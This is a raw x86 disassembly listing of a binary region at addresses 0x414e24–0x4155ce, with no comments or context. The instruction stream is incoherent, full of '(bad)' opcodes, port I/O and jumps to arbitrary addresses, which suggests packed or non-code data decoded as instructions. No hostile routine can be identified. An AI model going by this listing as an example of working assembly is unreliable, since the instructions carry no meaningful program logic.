  414e24:	div    BYTE PTR [esi]
  414e26:	mov    ecx,0x412b36bc
  414e2b:	mov    ebx,0xb947d4a7
  414e30:	jo     0x414e9f
  414e32:	cmp    al,0x5d
  414e34:	mov    eax,edi
  414e36:	adc    eax,0x696a81b4
  414e3b:	js     0x414e88
  414e3d:	adc    BYTE PTR [esi-0x303823e7],bl
  414e43:	mov    WORD PTR [esi-0x74],cs
  414e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e47:	cmp    BYTE PTR [esi+0x5f],al
  414e4a:	push   ebp
  414e4b:	lods   al,BYTE PTR ds:[esi]
  414e4c:	jbe    0x414dda
  414e4e:	aaa    
  414e4f:	dec    ecx
  414e50:	jno    0x414e23
  414e52:	daa    
  414e53:	xchg   ebx,eax
  414e54:	fadd   QWORD PTR [esi]
  414e56:	mov    edi,0x3a1ea4ae
  414e5b:	outs   dx,DWORD PTR ds:[esi]
  414e5c:	imul   esi,DWORD PTR [edi+0x23793264],0x7b77e498
  414e66:	mov    ds:0x2a770058,eax
  414e6b:	fwait
  414e6c:	mov    dh,0x1d
  414e6e:	pop    ds
  414e6f:	nop
  414e70:	ror    edi,0xa4
  414e73:	sub    cl,0x1b
  414e76:	jne    0x414e06
  414e78:	sbb    DWORD PTR [eax-0x37],esi
  414e7b:	loop   0x414ea0
  414e7d:	xchg   BYTE PTR [ebp-0x162abd1d],cl
  414e83:	dec    ecx
  414e84:	mov    esi,0x3bdc7747
  414e89:	or     al,0x9e
  414e8b:	inc    BYTE PTR [ebp+0x45]
  414e8e:	mov    ah,0x93
  414e90:	mov    fs,WORD PTR [esi+0xc]
  414e93:	mov    ah,0x16
  414e95:	jnp    0x414ee4
  414e97:	mov    BYTE PTR [esi-0x11ac7ace],dh
  414e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e9e:	mov    dh,0x10
  414ea0:	das    
  414ea1:	lods   al,BYTE PTR ds:[esi]
  414ea2:	gs cmc 
  414ea4:	xchg   edx,eax
  414ea5:	mov    ebx,0x188fbcf3
  414eaa:	xchg   ecx,eax
  414eab:	imul   ebx,DWORD PTR [eax-0x4ce14618],0x1a
  414eb2:	mov    ss,WORD PTR [ebx+ebx*4]
  414eb5:	mov    esi,0xfaa2d3ea
  414eba:	cmp    al,0xb1
  414ebc:	xchg   ebp,eax
  414ebd:	or     ebp,DWORD PTR [edi+0x6b]
  414ec0:	inc    esi
  414ec1:	pop    edi
  414ec2:	mov    al,0x60
  414ec4:	pop    esp
  414ec5:	je     0x414e7c
  414ec7:	pop    edx
  414ec8:	pop    es
  414ec9:	test   BYTE PTR ds:0x90deaef8,0x80
  414ed0:	cmp    ebp,DWORD PTR [esi+edi*1]
  414ed3:	inc    edi
  414ed4:	call   0xf340dbb1
  414ed9:	data16 (bad) 
  414edb:	push   edi
  414edc:	inc    edx
  414edd:	cmp    ebp,esp
  414edf:	jb     0x414f54
  414ee1:	fndisi(8087 only) 
  414ee3:	fsubr  QWORD PTR [ebp+0x4e901cf5]
  414ee9:	ds stos DWORD PTR es:[edi],eax
  414eeb:	jecxz  0x414f14
  414eed:	pop    esp
  414eee:	iret   
  414eef:	loope  0x414f47
  414ef1:	dec    eax
  414ef2:	mov    ebx,0xe6c4541f
  414ef7:	cs pop ss
  414ef9:	inc    edx
  414efa:	in     al,0xfd
  414efc:	scas   eax,DWORD PTR es:[edi]
  414efd:	enter  0x19fe,0xf2
  414f01:	scas   eax,DWORD PTR es:[edi]
  414f02:	sbb    al,cl
  414f04:	mov    dh,0x8c
  414f06:	fcmove st,st(7)
  414f08:	and    eax,ecx
  414f0a:	call   0x209f4097
  414f0f:	mov    esp,DWORD PTR [esi]
  414f11:	push   0x5aec8ab0
  414f16:	ret    0x464b
  414f19:	mov    eax,0xd51d5e32
  414f1e:	shl    DWORD PTR [edx-0x2e],0x7e
  414f22:	stc    
  414f23:	gs aaa 
  414f25:	add    DWORD PTR [edi+0x5c],0xffffffff
  414f29:	test   al,0x49
  414f2b:	pop    ebx
  414f2c:	xor    al,BYTE PTR [eax-0xa1c103d]
  414f32:	jmp    0x449763ef
  414f37:	push   0xbb3858b6
  414f3c:	lods   eax,DWORD PTR ds:[esi]
  414f3d:	pop    esp
  414f3e:	mov    bl,0x2b
  414f40:	dec    edi
  414f41:	fisubr WORD PTR [ebp+0x33]
  414f44:	shl    bh,cl
  414f46:	dec    esi
  414f47:	or     DWORD PTR [edi-0x7d],esi
  414f4a:	mov    ds:0x368f855,al
  414f4f:	mov    ds:0xc95bf016,eax
  414f54:	xchg   ebp,eax
  414f55:	sbb    dh,bh
  414f57:	inc    ebp
  414f58:	int3   
  414f59:	push   ecx
  414f5a:	stos   DWORD PTR es:[edi],eax
  414f5b:	pop    ebp
  414f5c:	pop    esi
  414f5d:	popa   
  414f5e:	ins    DWORD PTR es:[edi],dx
  414f5f:	cmp    al,0xec
  414f61:	push   0x6d1a532a
  414f66:	inc    ecx
  414f67:	cwde   
  414f68:	jp     0x414f4c
  414f6a:	scas   eax,DWORD PTR es:[edi]
  414f6b:	das    
  414f6c:	ss or  eax,0xdf67b6ac
  414f72:	add    BYTE PTR [ebp+0x45366f03],bh
  414f78:	mov    al,ds:0x8b55bace
  414f7d:	mov    ebx,0xb31d4b27
  414f82:	fsubr  QWORD PTR [ecx+esi*1-0x16]
  414f86:	aaa    
  414f87:	repz sub al,0xae
  414f8a:	rcr    bh,0x31
  414f8d:	xor    bl,BYTE PTR [eax+eax*1+0x4f]
  414f91:	adc    DWORD PTR [esi+eiz*2],esi
  414f94:	xchg   ebx,eax
  414f95:	arpl   WORD PTR [eax],bp
  414f97:	ja     0x414f40
  414f99:	(bad)  
  414f9a:	mov    ds:0x68c0a0,eax
  414f9f:	pusha  
  414fa0:	push   ebp
  414fa1:	jo     0x414f40
  414fa3:	sbb    edx,DWORD PTR [eax+ebp*8+0xb]
  414fa7:	call   0x60d719bf
  414fac:	xor    al,0x36
  414fae:	cmp    eax,0x41d8ace6
  414fb3:	dec    esi
  414fb4:	add    eax,0xd02342f2
  414fb9:	test   DWORD PTR [ecx-0x45040bea],0x626d101
  414fc3:	ins    DWORD PTR es:[edi],dx
  414fc4:	xchg   edx,eax
  414fc5:	stos   BYTE PTR es:[edi],al
  414fc6:	xor    esp,DWORD PTR [edi-0x5797e3a5]
  414fcc:	int    0x33
  414fce:	div    BYTE PTR [ecx-0x61]
  414fd1:	mov    eax,0x4aa0efb4
  414fd6:	cmc    
  414fd7:	inc    ebp
  414fd8:	xchg   esi,eax
  414fd9:	(bad)  
  414fda:	mov    ah,0x2c
  414fdc:	fdivr  QWORD PTR [ebx+0x4449318a]
  414fe2:	push   esp
  414fe3:	sbb    ah,dl
  414fe5:	xor    al,0xd3
  414fe7:	ror    DWORD PTR [ebx-0x55],0xeb
  414feb:	je     0x414f9b
  414fed:	jne    0x415056
  414fef:	lods   eax,DWORD PTR ds:[esi]
  414ff0:	call   0xa0c8fa5
  414ff5:	inc    eax
  414ff6:	dec    ebp
  414ff7:	xor    dh,BYTE PTR ds:[esi-0x68]
  414ffb:	fild   DWORD PTR ds:0x981174dd
  415001:	mov    ebp,?
  415003:	and    BYTE PTR ss:[esp+eiz*4+0x1eb49812],al
  41500b:	or     eax,0x7cfef3eb
  415010:	inc    ebp
  415011:	push   ebp
  415012:	cmc    
  415013:	cmp    al,0x5d
  415015:	lods   eax,DWORD PTR ds:[esi]
  415016:	fucom  st(1)
  415018:	adc    DWORD PTR [esi+0x247b8968],0xffffffbc
  41501f:	in     eax,dx
  415020:	pop    esi
  415021:	(bad)  
  415022:	lock lods al,BYTE PTR ds:[esi]
  415024:	(bad)  
  415025:	stc    
  415026:	push   es
  415027:	sub    esp,DWORD PTR [edx+0x39]
  41502a:	pop    esp
  41502b:	mov    ds:0xccbd1f8a,al
  415030:	mov    edi,0x116d6708
  415035:	(bad)  
  415036:	scas   eax,DWORD PTR es:[edi]
  415037:	in     eax,dx
  415038:	mov    ds:0x4ecb4117,al
  41503d:	jecxz  0x4150ae
  41503f:	dec    ebx
  415040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415041:	cwde   
  415042:	push   ebp
  415043:	xchg   esp,eax
  415044:	and    edi,DWORD PTR [ebx]
  415046:	repz out 0x33,eax
  415049:	add    ecx,ebx
  41504b:	and    BYTE PTR [ecx+0x7c3b7de5],dh
  415051:	ror    BYTE PTR [eax-0x46],0xe
  415055:	sbb    ch,bl
  415057:	cmp    ebx,DWORD PTR [edx]
  415059:	xchg   edi,eax
  41505a:	or     bl,cl
  41505c:	dec    edi
  41505d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41505e:	lods   eax,DWORD PTR ds:[esi]
  41505f:	adc    al,dh
  415061:	imul   ebp,DWORD PTR [edi+0x74],0x8d02bf29
  415068:	mov    ebx,0xb5274915
  41506d:	push   ebx
  41506e:	sbb    al,0x6b
  415070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415071:	add    ax,0x78fd
  415076:	pop    ecx
  415077:	lods   eax,DWORD PTR ds:[esi]
  415078:	(bad)  
  415079:	int    0xbc
  41507b:	jno    0x41501f
  41507d:	rol    BYTE PTR [ebp-0x7a6daca9],0xbc
  415084:	mov    DWORD PTR [edx+0x6c023077],esp
  41508a:	mov    dl,0xcd
  41508c:	lds    ebx,FWORD PTR es:[eax+0x3196cce]
  415093:	into   
  415094:	stos   BYTE PTR es:[edi],al
  415095:	sti    
  415096:	inc    ebp
  415097:	sbb    al,0x3b
  415099:	stos   BYTE PTR es:[edi],al
  41509a:	loop   0x4150da
  41509c:	out    dx,eax
  41509d:	ins    BYTE PTR es:[edi],dx
  41509e:	or     bh,ch
  4150a0:	fcomp  DWORD PTR [edi]
  4150a2:	scas   al,BYTE PTR es:[edi]
  4150a3:	les    esi,FWORD PTR [esi]
  4150a5:	pop    edx
  4150a6:	inc    ecx
  4150a7:	push   esp
  4150a8:	imul   ecx,DWORD PTR [eax],0x2b
  4150ab:	es and eax,0x88a3624e
  4150b1:	mov    BYTE PTR [edx-0x5a81d0c3],ch
  4150b7:	xor    dh,ch
  4150b9:	or     BYTE PTR [ecx+0x34],cl
  4150bc:	jle    0x4150f4
  4150be:	cmp    ch,BYTE PTR [edx-0x765afd08]
  4150c4:	xchg   DWORD PTR [eax+0x27f064e2],ecx
  4150ca:	call   0x593373f7
  4150cf:	fadd   st(0),st
  4150d1:	fnstcw WORD PTR [edi]
  4150d3:	pop    esi
  4150d4:	xchg   edx,eax
  4150d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150d6:	out    dx,al
  4150d7:	jns    0x415068
  4150d9:	pop    edi
  4150da:	jbe    0x415152
  4150dc:	les    edx,FWORD PTR [ebx+0x273527b3]
  4150e2:	push   0x27
  4150e4:	sbb    BYTE PTR [edx+0x6129b379],al
  4150ea:	(bad)  
  4150eb:	(bad)  
  4150ec:	sub    al,0x73
  4150ee:	sub    ebx,DWORD PTR [edx+0x5c05ec20]
  4150f4:	pusha  
  4150f5:	ins    BYTE PTR es:[edi],dx
  4150f6:	fstp   QWORD PTR [ebx-0x5f197941]
  4150fc:	scas   eax,DWORD PTR es:[edi]
  4150fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150fe:	sbb    esp,DWORD PTR [esi-0x50]
  415101:	mov    ecx,0x5b9ace59
  415106:	fistp  WORD PTR fs:[esp+eax*1]
  41510a:	fwait
  41510b:	outs   dx,DWORD PTR es:[esi]
  41510d:	rcl    DWORD PTR [esi+0x29220d06],1
  415113:	dec    ebx
  415114:	cmp    BYTE PTR [eax],bh
  415116:	jb     0x41514a
  415118:	jg     0x41517f
  41511a:	sub    DWORD PTR [esp+ebx*2],ecx
  41511d:	inc    edx
  41511e:	push   esp
  41511f:	sub    eax,DWORD PTR [ebx]
  415121:	xor    edi,esi
  415123:	cmp    ecx,edi
  415125:	mov    ds:0x8b0306dd,al
  41512a:	mov    dl,0x5c
  41512c:	xchg   ecx,eax
  41512d:	mov    eax,0x36379214
  415132:	mov    edx,0xb135f1fc
  415137:	aaa    
  415138:	push   0x79f4a282
  41513d:	sbb    esi,DWORD PTR [esi-0x4795b8bf]
  415143:	sbb    ah,ah
  415145:	popa   
  415146:	adc    BYTE PTR [esi],cl
  415148:	ds mov bl,0x8
  41514b:	idiv   BYTE PTR [eax-0x3]
  41514e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41514f:	das    
  415150:	jmp    0xf392:0x807cf42e
  415157:	icebp  
  415158:	test   BYTE PTR [ebp-0x2f4283e6],dl
  41515e:	out    0x74,eax
  415160:	add    BYTE PTR ds:0xe68ead99,dl
  415166:	outs   dx,BYTE PTR ds:[esi]
  415167:	ja     0x4151e5
  415169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41516a:	sub    ah,0x7c
  41516d:	inc    edi
  41516e:	cmp    esp,ecx
  415170:	and    ecx,esp
  415172:	call   0x809f:0xc829b0
  415179:	jg     0x41519e
  41517b:	popa   
  41517c:	mov    esi,0x13c1d2af
  415181:	mov    edx,0x7d03f8c8
  415186:	int    0x9a
  415188:	loopne 0x41513b
  41518a:	cs mov ebx,0x9003c070
  415190:	(bad)  
  415192:	outs   dx,DWORD PTR gs:[esi]
  415194:	or     eax,0xde8390b0
  415199:	push   ss
  41519a:	jmp    0x41521a
  41519c:	add    al,0x96
  41519e:	jb     0x415141
  4151a0:	mov    dl,dh
  4151a2:	daa    
  4151a3:	xor    cl,BYTE PTR [esi-0x1f]
  4151a6:	(bad)  [esi]
  4151a8:	sbb    BYTE PTR [ebp-0x555ea4e],bh
  4151ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151af:	jp     0x415183
  4151b1:	cli    
  4151b2:	jmp    0x1ebb:0xe9f4c4f6
  4151b9:	adc    ecx,esp
  4151bb:	pop    es
  4151bc:	and    esi,DWORD PTR [ecx]
  4151be:	cld    
  4151bf:	xchg   ecx,eax
  4151c0:	adc    dl,bh
  4151c2:	mov    ecx,0xebe43cc8
  4151c7:	ficomp WORD PTR [esi+0x5da58ef]
  4151cd:	xor    BYTE PTR [eax+0x25],dl
  4151d0:	loop   0x415236
  4151d2:	adc    DWORD PTR [edx+edx*2],edx
  4151d5:	out    dx,al
  4151d6:	ret    0x44a6
  4151d9:	sub    ecx,esp
  4151db:	adc    dh,BYTE PTR [edi+0x266304fb]
  4151e1:	jo     0x415180
  4151e3:	inc    ecx
  4151e4:	push   0x26
  4151e6:	test   DWORD PTR [ecx],esp
  4151e8:	imul   ecx,DWORD PTR [edi+0x4c35fd5a],0xffffffdb
  4151ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151f0:	mov    dl,0xf
  4151f2:	daa    
  4151f3:	fsubr  st,st(0)
  4151f5:	loop   0x4151ce
  4151f7:	xor    eax,0x94e09af3
  4151fc:	pop    ecx
  4151fd:	jno    0x4151e7
  4151ff:	xor    DWORD PTR [ebx+edi*4+0x53ada37c],ecx
  415206:	cmp    BYTE PTR [ebx+ecx*8-0x3ade0645],0xb8
  41520e:	aaa    
  41520f:	fild   DWORD PTR [ebx-0x17]
  415212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415213:	and    BYTE PTR [ebp-0x6c],0x1c
  415217:	in     al,0x43
  415219:	push   ebp
  41521a:	sub    edx,DWORD PTR [edi+0x77]
  41521d:	cld    
  41521e:	sti    
  41521f:	inc    edx
  415220:	mov    esi,esi
  415222:	arpl   bx,sp
  415224:	jo     0x4151e3
  415226:	dec    edi
  415227:	cli    
  415228:	aam    0x62
  41522a:	sbb    al,0x1f
  41522c:	xchg   edi,eax
  41522d:	mov    ebx,0xc5ac51f5
  415232:	push   esi
  415233:	adc    ch,BYTE PTR [esi]
  415235:	jmp    0xcfde9066
  41523a:	nop
  41523b:	jo     0x415299
  41523d:	popa   
  41523e:	dec    eax
  41523f:	daa    
  415240:	bound  eax,QWORD PTR [edi+0x3e0f2414]
  415246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415247:	jne    0x4151d3
  415249:	mov    eax,es:0xfa762c3c
  41524f:	sbb    DWORD PTR [edx],eax
  415251:	ja     0x415236
  415253:	mov    eax,DWORD PTR [ebp+0x2a]
  415256:	adc    DWORD PTR [esp+ebx*1+0x5],0x19
  41525b:	loopne 0x4152cb
  41525d:	cmp    BYTE PTR [ecx+eiz*2+0x35],dh
  415261:	lds    edi,FWORD PTR [eax+0x34ae1961]
  415267:	imul   edi,DWORD PTR [edi+edx*1],0xf6472056
  41526e:	mov    dh,0xc7
  415270:	pop    es
  415271:	popf   
  415272:	jp     0x415286
  415274:	not    DWORD PTR [eax+0x55aa038]
  41527a:	add    dh,dl
  41527c:	mov    eax,DWORD PTR [edx-0x76]
  41527f:	stos   DWORD PTR es:[edi],eax
  415280:	sub    al,0xd0
  415282:	into   
  415283:	mov    cl,BYTE PTR [edx+0x56]
  415286:	ret    0x23f1
  415289:	mov    esi,DWORD PTR [edi-0x4669aeb4]
  41528f:	sbb    BYTE PTR [ecx+0xb],bl
  415292:	cmp    dl,BYTE PTR [ebx+0x78]
  415295:	add    ebx,DWORD PTR [ecx]
  415297:	mov    bh,0x89
  415299:	dec    esi
  41529a:	inc    ecx
  41529b:	mov    ss,WORD PTR [esi-0x17]
  41529e:	or     eax,0x77548d7b
  4152a3:	out    dx,eax
  4152a4:	add    al,BYTE PTR [edi+0x44bfb1fa]
  4152aa:	inc    edx
  4152ab:	imul   bl
  4152ad:	sub    ebp,esp
  4152af:	sbb    eax,0xc7145220
  4152b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152b5:	jmp    0x4152ac
  4152b7:	xchg   edx,eax
  4152b8:	popa   
  4152b9:	add    BYTE PTR [edi+ecx*2+0xe],0xaf
  4152be:	pop    es
  4152bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152c0:	sbb    DWORD PTR [edi+0x4dfe9164],ebp
  4152c6:	or     eax,0xd51acddb
  4152cb:	push   cs
  4152cc:	inc    edi
  4152cd:	dec    edx
  4152ce:	lods   al,BYTE PTR ds:[esi]
  4152cf:	jb     0x4152bd
  4152d1:	cld    
  4152d2:	aam    0xb8
  4152d4:	dec    esp
  4152d5:	add    ah,BYTE PTR ds:[edx+0x4e645115]
  4152dc:	add    bh,BYTE PTR [eax+0x2d]
  4152df:	inc    edi
  4152e0:	ret    
  4152e1:	adc    DWORD PTR [edi+0x3b573986],ebp
  4152e7:	faddp  st(2),st
  4152e9:	push   es
  4152ea:	js     0x4152ed
  4152ec:	out    dx,al
  4152ed:	adc    edi,ecx
  4152ef:	inc    esi
  4152f0:	div    BYTE PTR [edi+ebp*4]
  4152f3:	in     eax,dx
  4152f4:	bound  edx,QWORD PTR [ecx+0x38c6d782]
  4152fa:	lahf   
  4152fb:	cwde   
  4152fc:	mov    bh,0x92
  4152fe:	lods   al,BYTE PTR ds:[esi]
  4152ff:	or     ah,dh
  415301:	out    dx,al
  415302:	sub    dl,BYTE PTR [ebp+0x45a35d4]
  415308:	xchg   esi,eax
  415309:	xor    ch,BYTE PTR ds:0x3f1602b2
  41530f:	sub    al,0x69
  415311:	inc    esp
  415312:	or     ch,BYTE PTR [edx+0x7a]
  415315:	and    eax,0x841494a9
  41531a:	test   eax,0xd89421f0
  41531f:	xor    ecx,DWORD PTR [ecx]
  415321:	pop    esp
  415322:	jl     0x415324
  415324:	test   BYTE PTR [ebp-0x5cce983b],ah
  41532a:	mov    dl,0xf
  41532c:	xlat   BYTE PTR ds:[ebx]
  41532d:	jae    0x4152b7
  41532f:	inc    edx
  415330:	cmp    DWORD PTR [edx+eax*1],ebp
  415333:	mov    ah,0xc
  415335:	sub    DWORD PTR [ebx-0x2229e2c6],0xffffffd5
  41533c:	dec    esi
  41533d:	xchg   edx,eax
  41533e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41533f:	scas   eax,DWORD PTR es:[edi]
  415340:	fdiv   QWORD PTR [eax+0x21b5c77b]
  415346:	mov    ebp,0x6a376da
  41534b:	je     0x415368
  41534d:	in     eax,0x77
  41534f:	in     al,dx
  415350:	mov    cl,0xf1
  415352:	clc    
  415353:	aam    0xa0
  415355:	dec    ebp
  415356:	adc    ch,bl
  415358:	out    dx,eax
  415359:	cld    
  41535a:	pop    edi
  41535c:	xor    al,BYTE PTR [edi]
  41535e:	jge    0x41534d
  415360:	fdiv   st(1),st
  415362:	aam    0x64
  415364:	inc    esp
  415365:	call   0x23ba9341
  41536a:	xchg   BYTE PTR [ebp-0x4fb05d23],dh
  415370:	push   ebx
  415371:	adc    al,0x80
  415373:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  415375:	dec    edi
  415376:	xchg   esi,eax
  415377:	mov    ds:0xa406c026,eax
  41537c:	stos   DWORD PTR es:[edi],eax
  41537d:	sub    BYTE PTR [edx+esi*4],dl
  415380:	push   esp
  415381:	imul   ecx,DWORD PTR [ebx-0x15],0xa3f9bb7d
  415388:	adc    eax,DWORD PTR [ecx+0x3c]
  41538b:	(bad)  
  41538c:	into   
  41538d:	and    edx,DWORD PTR [eax-0x5c]
  415390:	push   ss
  415391:	cmp    DWORD PTR [eax+ebx*2],edi
  415394:	sbb    DWORD PTR [edx-0x106fc253],ebp
  41539a:	in     eax,dx
  41539b:	loopne 0x415366
  41539d:	or     al,0x58
  41539f:	std    
  4153a0:	outs   dx,BYTE PTR ds:[esi]
  4153a1:	xchg   DWORD PTR [ebx-0x31fe531],edx
  4153a7:	test   cl,bh
  4153a9:	sbb    eax,0x9968d455
  4153ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153af:	mov    dl,0x45
  4153b1:	retf   0x69b8
  4153b4:	jno    0x415398
  4153b6:	mov    BYTE PTR [esi-0x33293051],bl
  4153bc:	cmp    dl,bl
  4153be:	ds cdq 
  4153c0:	test   DWORD PTR [esi+ebx*1],0xf200d111
  4153c7:	xor    BYTE PTR [edx-0x2c],dl
  4153ca:	(bad)  
  4153cb:	rcr    bl,1
  4153cd:	or     DWORD PTR [ecx+0x2],esp
  4153d0:	mov    al,0x7b
  4153d2:	arpl   WORD PTR [eax-0x4116d9e5],bx
  4153d8:	cmp    ebx,DWORD PTR [ecx-0x2b5a6c05]
  4153de:	xor    ebx,DWORD PTR [esp+eax*8]
  4153e1:	dec    esi
  4153e2:	pop    eax
  4153e3:	out    dx,eax
  4153e4:	or     eax,0xdf093606
  4153e9:	xchg   DWORD PTR [edx+eax*1],ebp
  4153ec:	jmp    0x82fde015
  4153f1:	shl    DWORD PTR [ebx+0x21],0xaf
  4153f5:	clc    
  4153f6:	mov    ebp,DWORD PTR [ebp+0xa]
  4153f9:	xor    edx,DWORD PTR [edx]
  4153fb:	add    BYTE PTR [edx],0xef
  4153fe:	sub    DWORD PTR [edi+0x2b],ecx
  415401:	push   ebp
  415402:	out    dx,al
  415403:	sar    ebp,cl
  415405:	cmp    dl,BYTE PTR [eax-0x3e86595f]
  41540b:	pop    esi
  41540c:	push   ecx
  41540d:	mov    ebx,0x5a503da6
  415412:	inc    ecx
  415413:	pushf  
  415414:	jns    0x41548e
  415416:	std    
  415417:	xchg   edx,eax
  415418:	mov    ecx,DWORD PTR [edi-0x6d]
  41541b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41541c:	leave  
  41541d:	cmp    ebp,DWORD PTR [ecx+edx*2+0x76]
  415421:	add    eax,0xbe66aae0
  415426:	cs es hlt 
  415429:	xchg   ebx,eax
  41542a:	leave  
  41542b:	ins    DWORD PTR es:[edi],dx
  41542c:	push   ebp
  41542d:	imul   ecx,DWORD PTR ds:0x21bafdc3,0xffffffc9
  415434:	adc    bl,BYTE PTR [edi]
  415436:	mov    esp,0xc2429b42
  41543b:	in     eax,dx
  41543c:	mov    bl,0xb0
  41543e:	push   ebx
  41543f:	(bad)  
  415441:	in     eax,0x94
  415443:	jle    0x415464
  415445:	aad    0xfb
  415447:	xor    eax,0xebaa1838
  41544c:	dec    ecx
  41544d:	pop    esi
  41544e:	and    DWORD PTR [ebp-0x3f9889fb],ecx
  415454:	test   DWORD PTR [ebp-0xb05e05a],eax
  41545a:	shr    BYTE PTR [ecx-0x27a6edf8],1
  415460:	call   0xc06379f2
  415465:	cmp    edx,DWORD PTR [eax+0x7bff190b]
  41546b:	mov    al,ds:0x3d4e08d
  415470:	sub    eax,0x9db61f3c
  415475:	mov    ecx,0x1f406e83
  41547a:	ss nop
  41547c:	mov    dl,0x74
  41547e:	jnp    0x415499
  415480:	das    
  415481:	jp     0x41541a
  415483:	xchg   ecx,eax
  415484:	push   es
  415485:	cmp    BYTE PTR [edi+0x5976dac3],bl
  41548b:	adc    bh,BYTE PTR [esi+0x5b2b4acc]
  415491:	std    
  415492:	xchg   esp,eax
  415493:	mov    WORD PTR [edi],?
  415495:	int3   
  415496:	aad    0x76
  415498:	jmp    FWORD PTR [eax]
  41549a:	push   ebp
  41549b:	mov    esi,eax
  41549d:	ja     0x415423
  41549f:	push   eax
  4154a0:	xchg   BYTE PTR [ebx+0x7e8f44e0],bl
  4154a6:	ins    BYTE PTR es:[edi],dx
  4154a7:	or     al,0x14
  4154a9:	not    DWORD PTR [ebx+0x23]
  4154ac:	loop   0x415524
  4154ae:	mov    ebp,0x4791b500
  4154b3:	ds xchg esp,ebp
  4154b6:	int    0xcf
  4154b8:	pusha  
  4154b9:	rol    BYTE PTR [edx-0x242c677a],0xfc
  4154c0:	pushf  
  4154c1:	aas    
  4154c2:	push   ds
  4154c3:	mov    bl,0x2d
  4154c5:	sar    DWORD PTR [ecx+0x73],1
  4154c8:	icebp  
  4154c9:	pop    ds
  4154ca:	mov    eax,ds:0xedc3b0e5
  4154cf:	jae    0x41552a
  4154d1:	mov    BYTE PTR [ebx-0x5f],0x95
  4154d5:	ret    
  4154d6:	or     bh,BYTE PTR [ebx]
  4154d8:	cli    
  4154d9:	in     eax,0x55
  4154db:	sbb    DWORD PTR [eax+ebx*2],esi
  4154de:	mov    ebx,0x19e5f271
  4154e3:	jg     0x415546
  4154e5:	sar    BYTE PTR [eax],cl
  4154e7:	cwde   
  4154e8:	cmp    bl,BYTE PTR [eax-0x5f]
  4154eb:	xor    al,0x62
  4154ed:	and    BYTE PTR [esi+0x6f],ch
  4154f0:	shl    BYTE PTR [ebp+0x72],0xcd
  4154f4:	leave  
  4154f5:	add    DWORD PTR [eax+0x6ac616b8],ebx
  4154fb:	xor    DWORD PTR [eax-0x3c927ea4],edi
  415501:	mov    al,0x0
  415503:	sub    ebp,DWORD PTR [ebx+0xebb4183]
  415509:	jae    0x41550b
  41550b:	cdq    
  41550c:	mov    bl,0xa0
  41550e:	dec    eax
  41550f:	xlat   BYTE PTR ds:[ebx]
  415510:	sbb    eax,0x14a0a31b
  415515:	outs   dx,BYTE PTR ds:[esi]
  415516:	mov    ds:0x6008756d,eax
  41551b:	push   ebx
  41551c:	mov    eax,0x3af3ef13
  415521:	push   cs
  415522:	or     edi,DWORD PTR [ebx-0x6388fca8]
  415528:	fdivr  QWORD PTR [eax-0x7e25975e]
  41552e:	jecxz  0x4154be
  415530:	call   0x70bbe6b1
  415535:	jmp    FWORD PTR [edi]
  415537:	pushf  
  415538:	push   cs
  415539:	xchg   esp,eax
  41553a:	lods   al,BYTE PTR ds:[esi]
  41553b:	push   0x36
  41553d:	mul    BYTE PTR [esi]
  41553f:	out    dx,al
  415540:	int3   
  415541:	popf   
  415542:	adc    DWORD PTR [edx],0xa4d0639c
  415548:	into   
  415549:	fs push ds
  41554b:	imul   esi,eax,0x2c
  41554e:	pop    ecx
  41554f:	xchg   ecx,eax
  415550:	adc    DWORD PTR [ecx+0x417a962e],ecx
  415556:	test   BYTE PTR [eax],cl
  415558:	add    al,0x42
  41555a:	mov    ah,0xa0
  41555c:	and    ebx,DWORD PTR [ecx+0x3f]
  41555f:	jmp    0xb350:0x3d5a2450
  415566:	cld    
  415567:	jns    0x4154ed
  415569:	xchg   esi,eax
  41556a:	sub    eax,0x5d167f37
  41556f:	in     eax,dx
  415570:	push   esp
  415571:	je     0x4155dc
  415573:	mov    ecx,0x401933e
  415578:	dec    esi
  415579:	addr16 inc eax
  41557b:	aam    0x3f
  41557d:	sti    
  41557e:	jo     0x415527
  415580:	and    esi,DWORD PTR [edi-0x6ad5acf7]
  415586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415587:	pop    ss
  415588:	mov    bh,0xa6
  41558a:	in     al,dx
  41558b:	aam    0x5f
  41558d:	xor    dh,dl
  41558f:	test   al,0xbf
  415591:	es imul eax
  415594:	xor    bl,al
  415596:	retf   
  415597:	fild   WORD PTR [edi]
  415599:	scas   eax,DWORD PTR es:[edi]
  41559a:	stos   DWORD PTR es:[edi],eax
  41559b:	jne    0x415592
  41559d:	xchg   ebp,eax
  41559e:	xchg   edi,eax
  41559f:	pop    ss
  4155a0:	or     BYTE PTR ds:0x9aec34a5,0x2a
  4155a7:	pop    DWORD PTR [edi-0x76]
  4155aa:	xor    BYTE PTR [ecx+0x18],ch
  4155ad:	lock lods al,BYTE PTR es:[esi]
  4155b0:	xchg   ebp,eax
  4155b1:	jne    0x415594
  4155b3:	mov    ebx,ds
  4155b5:	xor    eax,0xf51a0dea
  4155ba:	std    
  4155bb:	cmp    BYTE PTR [esi+0x45211306],bh
  4155c1:	or     ecx,DWORD PTR [ebx+0x1ad6ed7e]
  4155c7:	popf   
  4155c8:	inc    eax
  4155c9:	ins    BYTE PTR es:[edi],dx
  4155ca:	pusha  
  4155cb:	pop    ss
  4155cc:	(bad)  
  4155ce:	inc    ebp
